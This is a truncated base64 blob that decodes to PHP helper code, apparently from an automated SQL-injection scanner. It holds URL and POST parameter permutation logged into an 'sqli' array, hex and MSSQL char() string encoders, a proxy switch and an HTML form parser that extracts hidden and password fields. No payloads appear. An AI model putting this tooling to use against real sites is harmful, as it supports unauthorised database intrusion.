R0eXBlPScxJyl7Ly/RhNGD0L3QutGG0LjRjyDQstGL0LLQvtC00LAg0L3QsCDRjdC60YDQsNC9CgkvLzEgLSAiWytdIiwgMiAtICJbLV0iLCAzIC0gIlsqXSIsIDQgLSAiIgoJJHJldCA9ICcnOwoJaWYoKCR0eXBlPDQpJiYoJHR5cGU+MCkpewoJCSR6PWFycmF5KCcrJywnLScsJyonKTsKCQkkcmV0PSc8YnI+WycuJHpbJHR5cGUtMV0uJ10gJy4kc3RyLiI8YnI+XHJcbiI7Cgl9ZWxzZXsKCQlpZigkdHlwZT09NCkkcmV0PSAnPGJyPicuJHN0ci4iPGJyPlxyXG4iOwoJfQoKCWVjaG8oJHJldCk7CgkvLyRmcD1mb3BlbignLi9sb2cudHh0JywnYScpOwoJLy9md3JpdGUoJGZwLCRyZXQpOwoJLy9mY2xvc2UoJGZwKTsKCWZsdXNoKCk7Cn0KCQkKCXB1YmxpYyBmdW5jdGlvbiB1cmxfc2V0KCRxdWVyeSwkbmFtZSl7Ly/QstC+0LfQstGA0LDRidCw0LXRgiDQv9C+0LvQvdGL0LkgdXJsICsg0LfQsNC/0LjRgdGMINCyINC70L7QswoKCgkkdG1wID0gJHRoaXMtPnNldFsnZnVsbCddLiRxdWVyeTsKCQoJCglpZigkbmFtZSkkdGhpcy0+c3FsaVskbmFtZV1bXSA9IHJhd3VybGRlY29kZSgkdG1wKTsvL9C00LvRjyDQu9C+0LPQsAoJaWYoJG5hbWUpJHRoaXMtPnNxbGlbJG5hbWUuJ19lbmNvZGUnXVtdID0gJHRtcDsvL9C00LvRjyDQu9C+0LPQsAoJcmV0dXJuICR0bXA7Cgp9CQoKCXB1YmxpYyBmdW5jdGlvbiB1cmxQYXJzZVVybCgkdXJsKXsKCgkJJHVybCA9IHN0cl9yZXBsYWNlKCcmYW1wOycsICImIiwgJHVybCk7CgkJCgkJaWYoIXN0cnN0cigkdXJsLCAnJicpKQoJCXsJCgkJCXJldHVybiBhcnJheSgkdXJsKTsKCQl9CgkJCgkJJHVybF9wYXJzZSA9IHBhcnNlX3VybCgkdXJsKTsKCQkkdXJsX3BhcmFtcyA9IGV4cGxvZGUoJyYnLCAkdXJsX3BhcnNlWydxdWVyeSddKTsKCQkKCQkKCQlmb3JlYWNoICgkdXJsX3BhcmFtcyBhcyAkcGFyYW0pCgkJewoKCQkJJGdvb2RfdXJsID0gc3RyX3JlcGxhY2UoJHBhcmFtLCAnJywgJHVybCkuJyYnLiRwYXJhbTsKCQkJJGdvb2RfdXJsID0gc3RyX3JlcGxhY2UoJyYmJywgJyYnLCAkZ29vZF91cmwpOwoJCQkkZ29vZF91cmwgPSBzdHJfcmVwbGFjZSgnPyYnLCAnPycsICRnb29kX3VybCk7CgkJCQoJCQkkbmV3W10gPSAkZ29vZF91cmw7CgkJCgkJfQoJCQoJCQoJCQoJCXJldHVybiAkbmV3OwovLwkJZGllKCk7Cgl9CgkKCXB1YmxpYyBmdW5jdGlvbiB1cmxQYXJzZVVybDMoJHVybCl7Ly/QtNC70Y8gYWRkINGE0YPQvdC60YbQuNC4INC/0YDQuCDQtNC+0LHQsNCy0LvQtdC90LjQuCDQsiBwdWxsCgoJCSR1cmwgPSBzdHJfcmVwbGFjZSgnJmFtcDsnLCAiJiIsICR1cmwpOwoJCQoJCQoJCSR1cmxfcGFyc2UgPSBwYXJzZV91cmwoJHVybCk7CgkJCgkJLy8kdGhpcy0+ZCgkdXJsX3BhcnNlLCckdXJsX3BhcnNlJyk7CgkJCgkJJHVybF9wYXJhbXMgPSBleHBsb2RlKCcmJywgJHVybF9wYXJzZVsncXVlcnknXSk7CgkJCgkJCgkJLy8kdGhpcy0+ZCgkdXJsX3BhcmFtcywnJHVybF9wYXJhbXMnKTsKCgkJJHN0ciA9ICcnOwoJCQoJCWZvcmVhY2ggKCR1cmxfcGFyYW1zIGFzICRwYXJhbSkKCQl7CgoJCQkkcHBwID0gZXhwbG9kZSgnPScsICRwYXJhbSk7CgkJCQoJCQlpZihpc3NldCgkcHBwWzBdKSBBTkQgc3RybGVuKCRwcHBbMF0pPjEpewoJCQkJJHN0ciAuPSRwcHBbMF0uJzonOwoJCQkJCgkJCX0KCQkJCgkJfQoJCQoJCSRyZXMgPSAgc3Vic3RyKCRzdHIsMCwtMSk7CgkJCgkJCgkJcmV0dXJuICRyZXM7CgkJCgl9CgkKCXB1YmxpYyBmdW5jdGlvbiBwb3N0UGFyc2VVcmwoJHF1ZXJ5KXsKCgkJJHF1ZXJ5ID0gc3RyX3JlcGxhY2UoJyZhbXA7JywgIiYiLCAkcXVlcnkpOwoJCQoJCQoJCSR1cmxfcGFyYW1zID0gZXhwbG9kZSgnJicsICRxdWVyeSk7CgkJCgkJCgkJZm9yZWFjaCAoJHVybF9wYXJhbXMgYXMgJHBhcmFtKQoJCXsKCQkJLy8kcGFyYW0gPSBzdHJfcmVwbGFjZSgnJicsICcnLCAkcGFyYW0pOwoJCQoJCQkkZ29vZF91cmwgPSBzdHJfcmVwbGFjZSgkcGFyYW0sICcnLCAkcXVlcnkpLicmJy4kcGFyYW07CgkJCSRnb29kX3VybCA9IHN0cl9yZXBsYWNlKCcmJicsICcmJywgJGdvb2RfdXJsKTsKCQkJJGdvb2RfdXJsID0gc3RyX3JlcGxhY2UoJz8mJywgJz8nLCAkZ29vZF91cmwpOwoJCQkKCQkJLy8kdGhpcy0+ZCgkZ29vZF91cmwsJyRnb29kX3VybCcpOwoJCQkKCQkJaWYoJGdvb2RfdXJsWzBdID09ICcmJyl7CgkJCQkKCQkJCQoJCQkJJGdvb2RfdXJsID0gc3Vic3RyKCRnb29kX3VybCwxKTsKCQkJfQoKCQkJCgkJCSRxdWVyeTJbXSA9ICRnb29kX3VybDsKCQkJCgkJfQoJCQoJCQoJCQoJCXJldHVybiAkcXVlcnkyOwovLwkJZGllKCk7Cgl9CgkKCXB1YmxpYyBmdW5jdGlvbiBzdHJ0b2hleCgkc3RyaW5nKSB7IC8v0YHQu9GD0LbQtdCx0L3QsNGPINGE0YPQvdC60YbQuNGPINC60L7Qv9C40YDQvtCy0LDQvdC40Y8KICAKCQkgICRoZXg9JzB4JzsKICAgIGZvciAoJGk9MDsgJGkgPCBzdHJsZW4oJHN0cmluZyk7ICRpKyspCiAgICB7CiAgICAgICAgJGhleCAuPSBkZWNoZXgob3JkKCRzdHJpbmdbJGldKSk7CiAgICB9CiAgICByZXR1cm4gJGhleDsKICAKCQkvL3JldHVybignMHgnLiRzKTsgCgoJfSAKCglwdWJsaWMgZnVuY3Rpb24gYXNjaWlFbmNvZGUoJHN0cil7Ly/Qv9C10YDQtdCy0L7QtNC40YIg0LIgYXNjaWkKICAgICAgaWYoIXByZWdfbWF0Y2goIi9eMHhbQS1GYS1mMC05XSsvIiwkc3RyKSl7CiAgICAgICByZXR1cm4gRkFMU0U7ICAgLy9Ob3QgYSBoZXggc3RyaW5nCiAgICAgIH0KICAgICAgICRzdHIgPSBzdWJzdHIoJHN0ciwyKTsKICAgICAkYXNjaWlTdHJpbmcgPSAiIjsKICAgICAgZm9yKCRpPTA7aXNzZXQoJHN0clskaV0pOyRpKz0yKXsKICAgICAgICRoZXhDaGFyID0gc3Vic3RyKCRzdHIsJGksMik7CiAgICAgICAgJGFzY2lpU3RyaW5nIC49IGNocihoZXhkZWMoJGhleENoYXIpKTsKICAgICAgfQogICByZXR1cm4gJGFzY2lpU3RyaW5nOwp9CgkKCXB1YmxpYyBmdW5jdGlvbiBIZXhWYWx1ZSgkZml0cmkpey8v0L/QtdGA0LXQstC+0LTQuNGCINCyIGhleAoJJGEgPSAnJzsKCWZvcigkaSA9IDA7ICRpIDwgc3RybGVuKCRmaXRyaSk7ICRpKyspCgl7CgkJJGEgLj0gZGVjaGV4KG9yZCgkZml0cmlbJGldKSk7Cgl9CglyZXR1cm4gJGE7Cgl9CgkKCXB1YmxpYyBmdW5jdGlvbiBwcm94eV9pbmooJHByb3h5KXsKCQoJCS8vcHJpbnRfcigkcHJveHkpOwoJCS8vZGllKCdhYWFhYWFhYWFhYWFhYWFhYWFoaGhoaCcpOwoJCgkJaWYoY291bnQoJHByb3h5KSA+IDApCgkJCXsKCQkJCS8vJHJhbmRfa2V5cyA9IGFycmF5X3JhbmQgKCRwcm94eSk7CgkJCQkvLyR0aGlzLT5wcm94eSA9ICRwcm94eVskcmFuZF9rZXlzXTsKCQkJCS8vJHRoaXMtPmQoJHRoaXMtPnByb3h5LCckdGhpcy0+cHJveHknKTsKCQkJCSR0aGlzLT5wcm94eV9lbmFibGU9dHJ1ZTsKCQkJCSR0aGlzLT5wcm94eSA9ICRwcm94eTsKCQkJCQoJCQkJCgkJCX1lbHNlCgkJCXsJCgkJCQlkaWUoJ05PVCBQUk9YWShwcm94eV9pbmopJyk7CgkJCX0KCQkJCgkKCX0KCQoJcHVibGljIGZ1bmN0aW9uIGNoYXJjaGVyKCRjb2RlKXsvL9CyINC00YDRg9Cz0YPRjiDQutC+0LTQuNGA0L7QstC60YMg0L/QtdGA0LXQstC+0LQKCQoJCQoJCWZvcigkaT0wOyRpPHN0cmxlbigkY29kZSk7JGkrKyl7CgkJCgkJCQoJCQlAJHRleHQuPW9yZCgkY29kZVskaV0pOwoJCQoJCQlpZigkaSE9PXN0cmxlbigkY29kZSktMSl7CgkJCQoJCQkJQCR0ZXh0Lj0nLCc7CgkJCgkJCX0KCQkKCQl9CgkJcmV0dXJuICR0ZXh0OwoJfQoJCglwdWJsaWMgZnVuY3Rpb24gY2hhcmNoZXJfbXNzcWwoJGNvZGUpey8v0LIg0LTRgNGD0LPRg9GOINC60L7QtNC40YDQvtCy0LrRgyDQv9C10YDQtdCy0L7QtAoJCgkJZm9yKCRpPTA7JGk8c3RybGVuKCRjb2RlKTskaSsrKXsKCQkKCQkJCgkJCUAkdGV4dD1vcmQoJGNvZGVbJGldKTsKCQkKCQkJCgkJCQoJCQlAJHRleHRfYWxsLj0iY2hhcigkdGV4dCkrIjsKCQkKCQkJCgkJCgkJfQoJCQoJCS8vcmV0dXJuICAkdGV4dF9hbGw7CgkJCgkJcmV0dXJuIHN1YnN0cigkdGV4dF9hbGwsIDAsIC0xKTsKCX0KCQoJcHVibGljIGZ1bmN0aW9uIGQoJHR4dCwkdGV4dCA9ICcnLCRwID0gZmFsc2UpewoJCWlmKCR0aGlzLT5sb2dfZW5hYmxlICE9IGZhbHNlKQoJCXsKCQkJaWYoJHRleHQgIT0gJycpe2VjaG8gIjxicj4tLS0tLS0+PnskdGV4dH08PC0tLS0tLS08YnI+Ijt9CgkJCQoJCQkKCQkJaWYoaXNfYXJyYXkoJHR4dCkgYW5kICRwICE9ZmFsc2UpCgkJCXsKCQkJCWZvcmVhY2goJHR4dCBhcyAkdCkKCQkJCXsKCQkJCQllY2hvICR0Lic8YnI+JzsKCQkJCX0KCQkJCgkJCX1lbHNlewoJCQkJZWNobyAnPHByZT4nOwoJCQkJcHJpbnRfcigkdHh0KTsKCQkJCWVjaG8gJzwvcHJlPic7CgkJCX0KCQkJaWYoJHRleHQgIT0gJycpe2VjaG8gIi0tLS0tLT4+eyR0ZXh0fTw8LS0tLS0tLTxicj4iO30KCQl9Cgl9CgkKCXB1YmxpYyBmdW5jdGlvbiBkZCgkdHh0LCR0ZXh0ID0gJycsJHAgPSBmYWxzZSl7CgkJCgkJCWlmKCR0ZXh0ICE9ICcnKXtlY2hvICI8YnI+LS0tLS0tPj57JHRleHR9PDwtLS0tLS0tPGJyPiI7fQoJCQkKCQkJCgkJCWlmKGlzX2FycmF5KCR0eHQpIGFuZCAkcCAhPWZhbHNlKQoJCQl7CgkJCQlmb3JlYWNoKCR0eHQgYXMgJHQpCgkJCQl7CgkJCQkJZWNobyAkdC4nPGJyPic7CgkJCQl9CgkJCQoJCQl9ZWxzZXsKCQkJCWVjaG8gJzxwcmU+JzsKCQkJCXByaW50X3IoJHR4dCk7CgkJCQllY2hvICc8L3ByZT4nOwoJCQl9CgkJCWlmKCR0ZXh0ICE9ICcnKXtlY2hvICItLS0tLS0+PnskdGV4dH08PC0tLS0tLS08YnI+Ijt9CgkJCgl9CgoJcHVibGljIGZ1bmN0aW9uIGRlYigkdGV4dCwkcHJpbSA9ICcnKXsKCgkJZWNobyAiPGJyPi0tLS0tLS0tJHByaW0tLS0tLS0tLS08YnI+IjsKCQllY2hvICAiPHByZT4iOwoJCXByaW50X3IgKCR0ZXh0KTsKCQllY2hvICI8L3ByZT4iOwoJfQoKCQp9CgoKY2xhc3MgSHRtbEZvcm1QYXJzZXIgewoJCgkvKioKCSAqIENvcmUgSFRNTCBEYXRhCgkgKiBAYWNjZXNzIHB1YmxpYwoJICogQHZhciBzdHJpbmcKCSAqIEBzZWUgSHRtbEZvcm1QYXJzZXIoKQoJICovCgl2YXIgJGh0bWxfZGF0YSA9ICcnOwoJCgkvKioKCSAqIFBhcmFtIEFycmF5IG9mIGFsbCBFbGVtZXRzCgkgKiBAYWNjZXNzIHByaXZhdGUKCSAqIEB2YXIgYXJyYXkKCSAqLwoJdmFyICRfcmV0dXJuID0gYXJyYXkoKTsKCQoJLyoqCgkgKiBGb3JtIGNvdW50ZXIKCSAqIEBhY2Nlc3MgcHJpdmF0ZQoJICogQHZhciBpbnQKCSAqLwoJdmFyICRfY291bnRlciA9ICcnOwoJCgkvKioKCSAqIEZvcm0gYnV0dG9uIENvdW50ZXIKCSAqIEBhY2Nlc3MgcHJpdmF0ZQoJICogQHZhciBpbnQKCSAqIEBzZWUgcGFyc2VGb3JtcygpCgkgKi8KCXZhciAkYnV0dG9uX2NvdW50ZXIgPSAnJzsKCQoJLyoqCgkgKiB1bmlxdWUgaWRlbnRpZmllcnQgZm9yIHBhcnNpbmcKCSAqIEBhY2Nlc3MgcHJpdmF0ZQoJICogQHZhciBzdHJpbmcKCSAqIEBzZWUgSHRtbEZvcm1QYXJzZXIoKQoJICovCgl2YXIgJF91bmlxdWVfaWQgPSAnJzsKCSAKCS8qKgoJICogSHRtbEZvcm1QYXJzZXIgQ29uc3RydWN0b3IKCSAqIEBhY2Nlc3MgcHVibGljCgkgKiBAcGFyYW0gbWl4ZWQgJGh0bWxfZGF0YSBDb3VsZCBiZSBlaXRoZXIgYW4gYmlnIGFycmF5IG9yIGFuIHN0cmluZwoJICovCglmdW5jdGlvbiBIdG1sRm9ybVBhcnNlciggJGh0bWxfZGF0YSApIHsKCQlpZiAoIGlzX2FycmF5KCRodG1sX2RhdGEpICkgewoJCQkkdGhpcy0+aHRtbF9kYXRhID0gam9pbignJywgJGh0bWxfZGF0YSk7CgkJfSBlbHNlIHsKCQkJJHRoaXMtPmh0bWxfZGF0YSA9ICRodG1sX2RhdGE7CgkJfQoJCSR0aGlzLT5fcmV0dXJuID0gYXJyYXkoKTsKCQkkdGhpcy0+X2NvdW50ZXIgPSAwOwoJCSR0aGlzLT5idXR0b25fY291bnRlciA9IDA7CgkJJHRoaXMtPl91bmlxdWVfaWQgPSBtZDUodGltZSgpKTsKCX0KCQoJLyoqCgkgKiBQYXJzZSBhbGwgRm9ybXMgaW4gZ2l2ZW4gRGF0YQoJICogQGFjY2VzcyBwdWJsaWMKCSAqIEByZXR1cm4gYXJyYXkKCSAqLwoJZnVuY3Rpb24gcGFyc2VGb3JtcygpIHsKCQlpZiAoIHByZWdfbWF0Y2hfYWxsKCIvPGZvcm0uKj4uKzxcL2Zvcm0+L2lzVSIsICR0aGlzLT5odG1sX2RhdGEsICRmb3JtcykgKSAKCQl7CgkJCWZvcmVhY2ggKCAkZm9ybXNbMF0gYXMgJGZvcm0gKSAKCQkJewoJCQkJLyoKCQkJCSAqIEZvcm0gRGV0YWlscyBsaWtlIG1ldGhvZCwgYWN0aW9uIC4uCgkJCQkgKi8KCQkJCXByZWdfbWF0Y2goIi88Zm9ybS4qbmFtZT1bXCInXT8oW1x3XHNdKilbXCInXT9bXHM+XS9pIiwgJGZvcm0sICRmb3JtX25hbWUpOwoJCQkJJHRoaXMtPl9yZXR1cm5bJHRoaXMtPl9jb3VudGVyXVsnZm9ybV9kYXRhJ11bJ25hbWUnXSA9IHByZWdfcmVwbGFjZSgiL1tcIic8Pl0vIiwgIiIsICRmb3JtX25hbWVbMV0pOwoJCQkJcHJlZ19tYXRjaCgiLzxmb3JtLipbXlw/XWFjdGlvbj0oXCIoW15cIl0qKVwifCcoW14nXSopJ3xbXj5cc10qKShbXj5dKikvaXMiLCAkZm9ybSwgJGFjdGlvbik7CgkJCQkkdGhpcy0+X3JldHVyblskdGhpcy0+X2NvdW50ZXJdWydmb3JtX2RhdGEnXVsnYWN0aW9uJ10gPSBwcmVnX3JlcGxhY2UoIi9bXCInPD5dLyIsICIiLCAkYWN0aW9uWzFdKTsKCQkJCXByZWdfbWF0Y2goIi88Zm9ybS4qbWV0aG9kPVtcIiddPyhbXHdcc10qKVtcIiddP1tccz5dL2kiLCAkZm9ybSwgJG1ldGhvZCk7CgkJCQkkdGhpcy0+X3JldHVyblskdGhpcy0+X2NvdW50ZXJdWydmb3JtX2RhdGEnXVsnbWV0aG9kJ10gPSBwcmVnX3JlcGxhY2UoIi9bXCInPD5dLyIsICIiLCAkbWV0aG9kWzFdKTsKCQkJCXByZWdfbWF0Y2goIi88Zm9ybS4qZW5jdHlwZT0oXCIoW15cIl0qKVwifCcoW14nXSopJ3xbXj5cc10qKShbXj5dKikvaXMiLCAkZm9ybSwgJGVuY3R5cGUpOwoJCQkJJHRoaXMtPl9yZXR1cm5bJHRoaXMtPl9jb3VudGVyXVsnZm9ybV9kYXRhJ11bJ2VuY3R5cGUnXSA9IHByZWdfcmVwbGFjZSgiL1tcIic8Pl0vIiwgIiIsICRlbmN0eXBlWzFdKTsKCgoJCQkJLyoKCQkJCSAqIDx0ZXh0YXJlYSBlbnRyaWVzCgkJCQkgKi8KCQkJCSAKCQkJCSAvLwllY2hvIDExMTExMTExMTExMTExMTExMTE7CgkJCQkJLy9wcmludF9yKCRmb3JtKTsKCQkJCSAKCQkJCWlmICggcHJlZ19tYXRjaF9hbGwoIi88dGV4dGFyZWEuKj4uKjxcL3RleHRhcmVhPi9pc1UiLCAkZm9ybSwgJHRleHRhcmVhcykgKSAKCQkJCXsKCQkJCS8vZWNobyAyMjIyMjIyMjIyMjsKCQkJCQkKCQkJCQlmb3JlYWNoICggJHRleHRhcmVhc1swXSBhcyAkdGV4dGFyZWEgKSAKCQkJCQl7CgkJCQkJCXByZWdfbWF0Y2goIi88dGV4dGFyZWEuKj4oLiopPFwvdGV4dGFyZWE+L2lzVSIsICR0ZXh0YXJlYSwgJHRleHRhcmVhX3ZhbHVlKTsKCQkJCQkJJHRoaXMtPl9yZXR1cm5bJHRoaXMtPl9jb3VudGVyXVsnZm9ybV9lbGVtZXRzJ11bJHRoaXMtPl9nZXROYW1lKCR0ZXh0YXJlYSldID0gYXJyYXkoCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJJ3R5cGUnCT0+ICd0ZXh0YXJlYScsCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJJ3ZhbHVlJwk9PiAkdGV4dGFyZWFfdmFsdWVbMV0KCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkpOwoJCQkJCX0KCQkJCX0KCQkJCQovLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8g0L3QsNGH0LDQu9C+INC00L7QsdCw0LLQu9C10L3QvdC+0LPQviDRhtC40LrQu9CwINC/0L4gaW5wdXQKCgkJCQlpZiAoIHByZWdfbWF0Y2hfYWxsKCIvPGlucHV0LiovaW1zIiwgJGZvcm0sICRndGlucHV0cykgKSAKCQkJCXsKCQkJZm9yZWFjaCAoICRndGlucHV0c1swXSBhcyAkZ3RpbnB1dCkgCgkJCXsKCgkJCQkvKgoJCQkJICogPGlucHV0IHdpdGhvdXQgdHlwZQoJCQkJICovCgkJCQlpZiAoIHByZWdfbWF0Y2hfYWxsKCIvPGlucHV0IC4qL2ltcyIsICRndGlucHV0LCAkd290eXBlcykgKSAKCQkJCXsKCQkJCQlmb3JlYWNoICggJHdvdHlwZXNbMF0gYXMgJHdvdHlwZSkgCgkJCQkJewoJCQkJCQlpZiAoIXN0cmlzdHIoJHdvdHlwZSwndHlwZT0nKSkKCQkJCQkJewoJCQkJCQkkdGhpcy0+X3JldHVyblskdGhpcy0+X2NvdW50ZXJdWydmb3JtX2VsZW1ldHMnXVskdGhpcy0+X2dldE5hbWUoJHdvdHlwZSldID0gYXJyYXkoCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJJ3R5cGUnCT0+ICd0ZXh0JywKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkndmFsdWUnCT0+ICR0aGlzLT5fZ2V0VmFsdWUoJHdvdHlwZSkKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkpOwoJCQkJCQl9CgkJCQkJfQoJCQkJfQoKCQkJCQoJCQkJLyoKCQkJCSAqIDxpbnB1dCB0eXBlPWhpZGRlbiBlbnRyaWVzCgkJCQkgKi8KCQkJCWlmICggcHJlZ19tYXRjaF9hbGwoIi88aW5wdXQuKnR5cGU9W1wiJ10/aGlkZGVuW1wiJ10/Lio+L2lVIiwgJGd0aW5wdXQsICRoaWRkZW5zKSApIAoJCQkJewoJCQkJCWZvcmVhY2ggKCAkaGlkZGVuc1swXSBhcyAkaGlkZGVuICkgCgkJCQkJewoJCQkJCQoJCQkJCQkkdGhpcy0+X3JldHVyblskdGhpcy0+X2NvdW50ZXJdWydmb3JtX2VsZW1ldHMnXVskdGhpcy0+X2dldE5hbWUoJGhpZGRlbildID0gYXJyYXkoCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJJ3R5cGUnCT0+ICdoaWRkZW4nLAoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCSd2YWx1ZScJPT4gJHRoaXMtPl9nZXRWYWx1ZSgkaGlkZGVuKQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCSk7CgkJCQkJfQoJCQkJfQoJCQkJCgkJCQkvKgoJCQkJICogPGlucHV0IHR5cGU9dGV4dCBlbnRyaWVzCgkJCQkgKi8KCgkJCQlpZiAoIHByZWdfbWF0Y2hfYWxsKCIvPGlucHV0Lip0eXBlPVtcIiddP3RleHRbXCInXT8uKj4vaVUiLCAkZ3RpbnB1dCwgJHRleHRzKSApIAoJCQkJewoJCQkJCWZvcmVhY2ggKCAkdGV4dHNbMF0gYXMgJHRleHQgKSAKCQkJCQl7CgkJCQkJCSR0aGlzLT5fcmV0dXJuWyR0aGlzLT5fY291bnRlcl1bJ2Zvcm1fZWxlbWV0cyddWyR0aGlzLT5fZ2V0TmFtZSgkdGV4dCldID0gYXJyYXkoCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJJ3R5cGUnCT0+ICd0ZXh0JywKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkndmFsdWUnCT0+ICR0aGlzLT5fZ2V0VmFsdWUoJHRleHQpCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJKTsKCQkJCQl9CgkJCQl9CgoJCQkJCQkJLyoKCQkJCSAqIDxpbnB1dCB0eXBlPWZpbGUgZW50cmllcwoJCQkJICovCgkJCQlpZiAoIHByZWdfbWF0Y2hfYWxsKCIvPGlucHV0Lip0eXBlPVtcIiddP2ZpbGVbXCInXT8uKj4vaVUiLCAkZ3RpbnB1dCwgJGZpbGVzKSApIAoJCQkJeyAKCQkJCQlmb3JlYWNoICggJGZpbGVzWzBdIGFzICRmaWxlICkgCgkJCQkJewoJCQkJCQkkdGhpcy0+X3JldHVyblskdGhpcy0+X2NvdW50ZXJdWydmb3JtX2VsZW1ldHMnXVskdGhpcy0+X2dldE5hbWUoJGZpbGUpXSA9IGFycmF5KAoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCSd0eXBlJwk9PiAnZmlsZScsCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJJ3ZhbHVlJwk9PiAkdGhpcy0+X2dldFZhbHVlKCRmaWxlKQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCSk7CgkJCQkJfQoJCQkJfQoJCQkJCgkJCQkvKgoJCQkJICogPGlucHV0IHR5cGU9cGFzc3dvcmQgZW50cmllcwoJCQkJICovCgkJCQlpZiAoIHByZWdfbWF0Y2hfYWxsKCIvPGlucHV0Lip0eXBlPVtcIiddP3Bhc3N3b3JkW1wiJ10/Lio+L2lVIiwgJGd0aW5wdXQsICRwYXNzd29yZHMpICkgCgkJCQl7IAoJCQkJCWZvcmVhY2ggKCAkcGFzc3dvcmRzWzBdIGFzICRwYXNzd29yZCApIAoJCQkJCXsKCQkJCQkJJHRoaXMtPl9yZXR1cm5bJHRoaXMtPl9jb3VudGVyXVsnZm9ybV9lbGVtZXRzJ11bJHRoaXMtPl9nZXROYW1lKCRwYXNzd29yZCldID0gYXJyYXkoCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJJ3R5cGUnCT0+ICdwYXNzd29yZCcsCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJJ3ZhbHVlJwk9PiAkdGhpcy0+X2dldFZhbHVlKCRwYXNzd29yZCkKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkpOwoJCQkJCX0KCQkJCX0KCQkJCQoJCQkJCgkJCQkKCQkJCS8qCgkJCQkgKiA8aW5wdXQgdHlwZT1jaGVja2JveCBlbnRyaWVzCgkJCQkgKi8KCQkJCWlmICggcHJlZ19tYXRjaF9hbGwoIi88aW5wdXQuKnR5cGU9W1wiJ10/Y2hlY2tib3hbXCInXT8uKj4vaVUiLCAkZ3RpbnB1dCwgJGNoZWNrYm94ZXMpICkgCgkJCQl7CgkJCQkJZm9yZWFjaCAoICRjaGVja2JveGVzWzBdIGFzICRjaGVja2JveCApIAoJCQkJCXsKCQkJCQkJaWYgKCBwcmVnX21hdGNoKCIvY2hlY2tlZC9pIiwgJGNoZWNrYm94KSApIAoJCQkJCQl7CgkJCQkJCQkkdGhpcy0+X3JldHVyblskdGhpcy0+X2NvdW50ZXJdWydmb3JtX2VsZW1ldHMnXVskdGhpcy0+X2dldE5hbWUoJGNoZWNrYm94KV0gPSBhcnJheSgKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkndHlwZScJPT4gJ2NoZWNrYm94JywKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkndmFsdWUnCT0+ICdvbicKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkpOwoJCQkJCQl9IGVsc2UgewoJCQkJCQkJJHRoaXMtPl9yZXR1cm5bJHRoaXMtPl9jb3VudGVyXVsnZm9ybV9lbGVtZXRzJ11bJHRoaXMtPl9nZXROYW1lKCRjaGVja2JveCldID0gYXJyYXkoCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJJ3R5cGUnCT0+ICdjaGVja2JveCcsCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJJ3ZhbHVlJwk9PiAnJwoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCSk7CgkJCQkJCX0KCQkJCQl9CgkJCQl9CgkJCQkKCQkJCS8qCgkJCQkgKiA8aW5wdXQgdHlwZT1yYWRpbyBlbnRyaWVzCgkJCQkgKi8KCQkJCWlmICggcHJlZ19tYXRjaF9hbGwoIi88aW5wdXQuKnR5cGU9W1wiJ10/cmFkaW9bXCInXT8uKj4vaVUiLCAkZ3RpbnB1dCwgJHJhZGlvcykgKSB7CgkJCQkJZm9yZWFjaCAoICRyYWRpb3NbMF0gYXMgJHJhZGlvICkgewoJCQkJCQlpZiAoIHByZWdfbWF0Y2goIi9jaGVja2VkL2kiLCAkcmFkaW8pICkgewoJCQkJCQkJJHRoaXMtPl9yZXR1cm5bJHRoaXMtPl9jb3VudGVyXVsnZm9ybV9lbGVtZXRzJ11bJHRoaXMtPl9nZXROYW1lKCRyYWRpbyldID0gYXJyYXkoCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJJ3R5cGUnCT0+ICdyYWRpbycsCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJJ3ZhbHVlJwk9PiAkdGhpcy0+X2dldFZhbHVlKCRyYWRpbykKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkpOwoJCQkJCQl9CgkJCQkJfQkJCgkJCQl9CgkJCQkKCQkJCS8qCgkJCQkgKiA8aW5wdXQgdHlwZT1zdWJtaXQgZW50cmllcwoJCQkJICovCgkJCQlpZiAoIHByZWdfbWF0Y2hfYWxsKCIvPGlucHV0Lip0eXBlPVtcIiddP3N1Ym1pdFtcIiddPy4qPi9pVSIsICRndGlucHV0LCAkc3VibWl0cykgKSB7CgkJCQkJZm9yZWFjaCAoICRzdWJtaXRzWzBdIGFzICRzdWJtaXQgKSB7CgkJCQkJCSR0aGlzLT5fcmV0dXJuWyR0aGlzLT5fY291bnRlcl1bJ2J1dHRvbnMnXVskdGhpcy0+YnV0dG9uX2NvdW50ZXJdID0gYXJyYXkoCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJJ3R5cGUnCT0+ICdzdWJtaXQnLAoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCSduYW1lJwk9PiAkdGhpcy0+X2dldE5hbWUoJHN1Ym1pdCksCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJJ3ZhbHVlJwk9PiAkdGhpcy0+X2dldFZhbHVlKCRzdWJtaXQpCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJKTsKCQkJCQkJJHRoaXMtPmJ1dHRvbl9jb3VudGVyKys7CgkJCQkJfQoJCQkJfQoJCQkJCgkJCQkvKgoJCQkJICogPGlucHV0IHR5cGU9YnV0dG9uIGVudHJpZXMKCQkJCSAqLwoJCQkJaWYgKCBwcmV